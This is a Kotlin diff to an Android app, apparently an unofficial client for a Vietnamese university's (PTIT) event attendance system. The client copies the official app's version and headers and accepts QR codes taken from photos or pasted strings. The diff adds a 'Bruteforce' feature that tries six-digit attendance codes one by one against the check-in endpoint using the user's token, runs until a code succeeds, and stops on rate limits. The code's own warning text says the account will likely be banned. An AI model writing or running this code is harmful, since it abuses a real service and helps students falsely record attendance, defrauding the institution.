@@ -35,41 +35,42 @@ class MainActivity : AppCompatActivity() {
     private lateinit var tokenIn: EditText
     private lateinit var uploadResult: TextView
 
-    // Version khớp app gốc cao nhất hiện tại: 2.3.9 / 80067
+    // Version khớp app gốc hiện tại
     private val appVersionName = "2.3.9"
-    private val appVersionCode = "80067"
+    private val appVersionCode = "80075"
 
-    private enum class PendingFlow { NONE, CAMERA_QR, IMAGE_QR_SELF }
-    private var pendingFlow = PendingFlow.NONE
+    // Trạng thái cho từng luồng
+    private enum class Flow { NONE, CAMERA_SCAN, IMAGE_QR }
+    private var flow = Flow.NONE
+
+    // Bruteforce
+    @Volatile private var bruteCancel = false
+    private var bruteThread: Thread? = null
 
     // ========== Launchers ==========
     private val scanLauncher = registerForActivityResult(ScanContract()) { r ->
         val content = r.contents
-        when (pendingFlow) {
-            PendingFlow.CAMERA_QR -> {
-                pendingFlow = PendingFlow.NONE
-                if (content != null) doCheckIn(content)
+        val mode = flow
+        flow = Flow.NONE
+        if (content == null) return@registerForActivityResult
+        when (mode) {
+            Flow.CAMERA_SCAN -> {
+                status.text = "✅ Đã quét QR\nĐang điểm danh…"
+                doCheckIn(content)
             }
-            PendingFlow.NONE -> {
-                if (content != null) doCheckIn(content)
-            }
-            else -> { /* không xảy ra */ }
+            else -> doCheckIn(content)
         }
     }
 
     private val pickImageLauncher = registerForActivityResult(
         ActivityResultContracts.GetContent()
     ) { uri: Uri? ->
-        val flow = pendingFlow
-        pendingFlow = PendingFlow.NONE
-        when (flow) {
-            PendingFlow.NONE -> {
-                if (uri != null) doUploadOnly(uri)
-            }
-            PendingFlow.IMAGE_QR_SELF -> {
-                if (uri != null) decodeQrThenCheckin(uri)
-            }
-            else -> { /* không xảy ra */ }
+        val mode = flow
+        flow = Flow.NONE
+        if (uri == null) return@registerForActivityResult
+        when (mode) {
+            Flow.IMAGE_QR -> decodeQrThenCheckin(uri)
+            else -> doUploadOnly(uri)
         }
     }
 
@@ -91,9 +92,9 @@ class MainActivity : AppCompatActivity() {
     private fun handleIntent(intent: Intent) {
         val data = intent.data ?: return
         if (data.scheme == "ptit.auth" && data.host == "SignIn") {
-            val code      = data.getQueryParameter("code")
-            val state     = data.getQueryParameter("state")
-            val error     = data.getQueryParameter("error")
+            val code = data.getQueryParameter("code")
+            val state = data.getQueryParameter("state")
+            val error = data.getQueryParameter("error")
             val errorDesc = data.getQueryParameter("error_description")
             if (error != null) { status.text = "SSO lỗi: $error\n${errorDesc.orEmpty()}"; return }
             if (code.isNullOrBlank()) { status.text = "Không nhận được code"; return }
@@ -114,6 +115,7 @@ class MainActivity : AppCompatActivity() {
             text = "PTIT S-Link Mini"; textSize = 22f; setPadding(0, 0, 0, 24)
         })
 
+        // ---- Login ----
         loginBox = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
         loginBox.addView(Button(this).apply {
             text = "Đăng nhập qua SSO"; setOnClickListener { startSso() }
@@ -123,48 +125,43 @@ class MainActivity : AppCompatActivity() {
         })
         root.addView(loginBox)
 
+        // ---- Home ----
         homeBox = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL; visibility = View.GONE
         }
-        homeBox.addView(TextView(this).apply {
-            text = "Điểm danh sự kiện"; textSize = 16f; setPadding(0, 0, 0, 8)
-        })
+
+        // ===== Khối 1: 3 tính năng chính =====
+        homeBox.addView(sectionHeader("Điểm danh sự kiện"))
         homeBox.addView(Button(this).apply {
             text = "📷 Quét QR bằng camera"
-            setOnClickListener { flowCamera() }
-        })
-        homeBox.addView(Button(this).apply {
-            text = "🖼️ Quét QR từ ảnh"
-            setOnClickListener { flowImageQr() }
+            setOnClickListener { startCameraScan() }
         })
         homeBox.addView(Button(this).apply {
             text = "⌨️ Nhập mã điểm danh"
-            setOnClickListener { flowManual() }
-        })
-
-        homeBox.addView(TextView(this).apply {
-            text = "Điểm danh không ảnh"; textSize = 16f; setPadding(0, 24, 0, 8)
+            setOnClickListener { showManualDialog() }
         })
         homeBox.addView(Button(this).apply {
-            text = "Quét QR (không ảnh)"
-            setOnClickListener { pendingFlow = PendingFlow.NONE; startScan() }
+            text = "🖼️ Trích mã từ ảnh QR"
+            setOnClickListener { startImageQr() }
         })
+
+        // ===== Khối 2: Điểm danh không ảnh (dự phòng) =====
+        homeBox.addView(sectionHeader("Điểm danh không ảnh"))
         manualQr = EditText(this).apply { hint = "Dán chuỗi QR (dự phòng)" }
         homeBox.addView(manualQr)
         homeBox.addView(Button(this).apply {
-            text = "Điểm danh từ chuỗi QR"
+            text = "Điểm danh từ chuỗi QR đã dán"
             setOnClickListener {
                 val s = manualQr.text.toString().trim()
                 if (s.isNotEmpty()) doCheckIn(s)
             }
         })
 
-        homeBox.addView(TextView(this).apply {
-            text = "Tiện ích"; textSize = 16f; setPadding(0, 24, 0, 8)
-        })
+        // ===== Khối 3: Tiện ích =====
+        homeBox.addView(sectionHeader("Tiện ích"))
         homeBox.addView(Button(this).apply {
             text = "📤 Upload ảnh (không điểm danh)"
-            setOnClickListener { pendingFlow = PendingFlow.NONE; pickImageLauncher.launch("image/*") }
+            setOnClickListener { flow = Flow.NONE; pickImageLauncher.launch("image/*") }
         })
         uploadResult = TextView(this).apply {
             textSize = 12f; setTextIsSelectable(true); setPadding(0, 8, 0, 8)
@@ -182,6 +179,13 @@ class MainActivity : AppCompatActivity() {
             }
         })
         homeBox.addView(Button(this).apply {
+            text = "🔍 Bruteforce mã (cảnh báo: có thể bị ban)"
+            setOnClickListener { showBruteforceDialog() }
+        })
+
+        // ===== Khối 4: Tài khoản =====
+        homeBox.addView(sectionHeader("Tài khoản"))
+        homeBox.addView(Button(this).apply {
             text = "Settings"; setOnClickListener { showSettings() }
         })
         homeBox.addView(Button(this).apply {
@@ -192,6 +196,7 @@ class MainActivity : AppCompatActivity() {
         })
         root.addView(homeBox)
 
+        // ---- Settings ----
         settingsBox = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL; visibility = View.GONE
         }
@@ -222,10 +227,16 @@ class MainActivity : AppCompatActivity() {
         return scroll
     }
 
+    private fun sectionHeader(text: String): TextView = TextView(this).apply {
+        this.text = text
+        textSize = 16f
+        setPadding(0, 24, 0, 8)
+    }
+
     private fun refreshUi() {
         val logged = session.isLoggedIn()
-        loginBox.visibility    = if (logged) View.GONE else View.VISIBLE
-        homeBox.visibility     = if (logged) View.VISIBLE else View.GONE
+        loginBox.visibility = if (logged) View.GONE else View.VISIBLE
+        homeBox.visibility = if (logged) View.VISIBLE else View.GONE
         settingsBox.visibility = View.GONE
         partIn.setText(session.partitionCode)
     }
@@ -340,7 +351,7 @@ class MainActivity : AppCompatActivity() {
         }
     } catch (_: Exception) { "" }
 
-    // ========== Headers (version 2.3.9) ==========
+    // ========== Headers ==========
     private fun authHeaders(): Map<String, String> {
         val h = mutableMapOf(
             "Authorization" to "Bearer ${session.accessToken}",
@@ -383,44 +394,39 @@ class MainActivity : AppCompatActivity() {
         else Api.postJson(url, body ?: "{}", authHeaders(), cb)
     }
 
-    // ========== 3 FLOW CHÍNH ==========
-
-    /** Flow 1: Quét QR bằng camera → điểm danh. */
-    private fun flowCamera() {
-        pendingFlow = PendingFlow.CAMERA_QR
-        status.text = "Quét QR sự kiện"
+    // ========== TÍNH NĂNG 1: Quét QR bằng camera ==========
+    private fun startCameraScan() {
+        flow = Flow.CAMERA_SCAN
+        status.text = "Đưa QR sự kiện vào khung"
         startScan()
     }
 
-    /** Flow 2: Chọn ảnh có QR → decode → điểm danh. */
-    private fun flowImageQr() {
-        pendingFlow = PendingFlow.IMAGE_QR_SELF
-        status.text = "Chọn ảnh có chứa QR sự kiện"
-        pickImageLauncher.launch("image/*")
-    }
-
-    /** Flow 3: Nhập mã điểm danh → điểm danh. */
-    private fun flowManual() {
+    // ========== TÍNH NĂNG 2: Nhập mã ==========
+    private fun showManualDialog() {
         val input = EditText(this).apply {
             hint = "Mã điểm danh (VD: 156485)"
             inputType = InputType.TYPE_CLASS_NUMBER
         }
         AlertDialog.Builder(this)
             .setTitle("Nhập mã điểm danh")
-            .setMessage("Mã hiển thị tại sự kiện. App gốc chỉ cần mã này là đủ điểm danh.")
+            .setMessage("Mã hiển thị tại sự kiện. App gốc chỉ cần mã này là đủ.")
             .setView(input)
             .setPositiveButton("Điểm danh") { _, _ ->
                 val code = input.text.toString().trim()
-                if (code.isBlank()) {
-                    status.text = "Chưa nhập mã"; return@setPositiveButton
-                }
+                if (code.isBlank()) { status.text = "Chưa nhập mã"; return@setPositiveButton }
                 doCheckInWithMa(code)
             }
             .setNegativeButton("Huỷ", null)
             .show()
     }
 
-    // ========== Decode QR từ ảnh rồi điểm danh ==========
+    // ========== TÍNH NĂNG 3: Trích mã từ ảnh QR ==========
+    private fun startImageQr() {
+        flow = Flow.IMAGE_QR
+        status.text = "Chọn ảnh có chứa QR sự kiện"
+        pickImageLauncher.launch("image/*")
+    }
+
     private fun decodeQrThenCheckin(uri: Uri) {
         status.text = "Đang đọc ảnh và giải mã QR…"
         try {
@@ -428,7 +434,7 @@ class MainActivity : AppCompatActivity() {
             if (bytes == null || bytes.isEmpty()) { status.text = "Không đọc được ảnh"; return }
             val decodedQr = decodeQrFromBytes(bytes)
             if (decodedQr == null) {
-                status.text = "❌ Không tìm thấy QR trong ảnh.\nThử ảnh rõ hơn hoặc dùng 'Nhập mã điểm danh'."
+                status.text = "❌ Không tìm thấy QR trong ảnh.\nThử ảnh rõ hơn hoặc dùng 'Nhập mã'."
                 return
             }
             doCheckIn(decodedQr)
@@ -437,7 +443,19 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ========== ĐIỂM DANH — đúng flow gốc: chỉ {ma, loaiQR} ==========
+    private fun decodeQrFromBytes(bytes: ByteArray): String? {
+        return try {
+            val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return null
+            val w = bmp.width; val h = bmp.height
+            val pixels = IntArray(w * h)
+            bmp.getPixels(pixels, 0, w, 0, 0, w, h)
+            val source = RGBLuminanceSource(w, h, pixels)
+            val binary = BinaryBitmap(HybridBinarizer(source))
+            MultiFormatReader().decode(binary).text
+        } catch (_: Exception) { null }
+    }
+
+    // ========== ĐIỂM DANH — body đúng app gốc ==========
     private fun doCheckInWithMa(ma: String) {
         val body = JSONObject()
             .put("ma", ma)
@@ -481,26 +499,12 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ========== Quét QR thường ==========
     private fun startScan() {
         val o = ScanOptions()
         o.setDesiredBarcodeFormats(ScanOptions.QR_CODE)
         o.setPrompt("Đưa QR điểm danh vào khung")
         o.setBeepEnabled(false); o.setOrientationLocked(false)
         scanLauncher.launch(o)
-    }
-
-    // ========== Decode QR từ bitmap ==========
-    private fun decodeQrFromBytes(bytes: ByteArray): String? {
-        return try {
-            val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return null
-            val w = bmp.width; val h = bmp.height
-            val pixels = IntArray(w * h)
-            bmp.getPixels(pixels, 0, w, 0, 0, w, h)
-            val source = RGBLuminanceSource(w, h, pixels)
-            val binary = BinaryBitmap(HybridBinarizer(source))
-            MultiFormatReader().decode(binary).text
-        } catch (_: Exception) { null }
     }
 
     private fun extractMaNhomQr(data: String): String {
@@ -517,7 +521,7 @@ class MainActivity : AppCompatActivity() {
         return data
     }
 
-    // ========== Upload ảnh không điểm danh (utility) ==========
+    // ========== Upload ảnh không điểm danh ==========
     private fun doUploadOnly(uri: Uri) {
         uploadResult.text = "Đang đọc ảnh…"
         try {
@@ -547,5 +551,119 @@ class MainActivity : AppCompatActivity() {
                 }
             }
         } catch (e: Exception) { uploadResult.text = "Lỗi: ${e.message}" }
+    }
+
+    // ========== BRUTEFORCE (utility, cảnh báo) ==========
+    private fun showBruteforceDialog() {
+        if (bruteThread?.isAlive == true) {
+            AlertDialog.Builder(this)
+                .setTitle("Bruteforce đang chạy")
+                .setMessage("Bạn muốn dừng?")
+                .setPositiveButton("Dừng") { _, _ ->
+                    bruteCancel = true
+                    status.text = "Đã yêu cầu dừng bruteforce…"
+                }
+                .setNegativeButton("Tiếp tục", null)
+                .show()
+            return
+        }
+
+        val container = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(48, 16, 48, 0)
+        }
+        val startIn = EditText(this).apply {
+            hint = "Từ (mặc định 150000)"; inputType = InputType.TYPE_CLASS_NUMBER
+        }
+        val endIn = EditText(this).apply {
+            hint = "Đến (mặc định 160000)"; inputType = InputType.TYPE_CLASS_NUMBER
+        }
+        val delayIn = EditText(this).apply {
+            hint = "Delay ms (mặc định 100 = ~10 req/s)"
+            inputType = InputType.TYPE_CLASS_NUMBER
+        }
+        container.addView(startIn)
+        container.addView(endIn)
+        container.addView(delayIn)
+        container.addView(TextView(this).apply {
+            text = "⚠️ Bruteforce 1M mã sẽ mất hàng giờ và gần như chắc chắn bị ban tài khoản.\n" +
+                   "Khuyến nghị: chạy range hẹp 150000-160000 trước (10K mã, ~17 phút ở 100ms)."
+            textSize = 11f
+            setPadding(0, 16, 0, 0)
+        })
+
+        AlertDialog.Builder(this)
+            .setTitle("Bruteforce mã điểm danh")
+            .setView(container)
+            .setPositiveButton("Chạy") { _, _ ->
+                val start = startIn.text.toString().trim().toIntOrNull() ?: 150000
+                val end = endIn.text.toString().trim().toIntOrNull() ?: 160000
+                val delay = delayIn.text.toString().trim().toLongOrNull() ?: 100L
+                if (start < 0 || end > 999999 || start > end) {
+                    status.text = "Range không hợp lệ (0–999999, start ≤ end)"
+                    return@setPositiveButton
+                }
+                startBruteforce(start, end, delay)
+            }
+            .setNegativeButton("Huỷ", null)
+            .show()
+    }
+
+    private fun startBruteforce(start: Int, end: Int, delayMs: Long) {
+        bruteCancel = false
+        val total = end - start + 1
+        status.text = "Bruteforce $start..$end ($total mã), delay ${delayMs}ms"
+
+        bruteThread = Thread {
+            var tried = 0
+            var i = start
+            while (i <= end && !bruteCancel) {
+                val ma = i.toString().padStart(6, '0')
+                val latch = java.util.concurrent.CountDownLatch(1)
+                var success = false
+                var respCopy = "TIMEOUT"
+
+                postWithAuth(
+                    "/slink/sv-su-kien/qr",
+                    JSONObject().put("ma", ma).put("loaiQR", "Tham gia").toString()
+                ) { ok, resp ->
+                    success = ok
+                    respCopy = resp
+                    latch.countDown()
+                }
+
+                latch.await(15, java.util.concurrent.TimeUnit.SECONDS)
+                tried++
+
+                val finalMa = ma
+                val finalSuccess = success
+                val finalResp = respCopy
+                val finalTried = tried
+                runOnUiThread {
+                    status.text = "[$finalTried/$total] ma=$finalMa\n" +
+                        if (finalSuccess) "🎯 SUCCESS: ${finalResp.take(300)}"
+                        else "resp: ${finalResp.take(150)}"
+                }
+
+                if (success && finalResp.contains("\"success\":true")) {
+                    runOnUiThread { status.text = "🎯 Tìm thấy ma=$finalMa\n$finalResp" }
+                    return@Thread
+                }
+
+                if (finalResp.contains("429") || finalResp.contains("Too Many", true) ||
+                    finalResp.contains("rate limit", true)) {
+                    runOnUiThread { status.text = "⚠️ Rate limit tại ma=$finalMa\nĐã dừng." }
+                    return@Thread
+                }
+
+                try { Thread.sleep(delayMs) } catch (_: InterruptedException) { return@Thread }
+                i++
+            }
+
+            runOnUiThread {
+                status.text = if (bruteCancel) "Đã dừng bruteforce (thử $tried mã)"
+                              else "Hoàn tất (thử $tried mã, không tìm thấy)"
+            }
+        }.start()
     }
 }
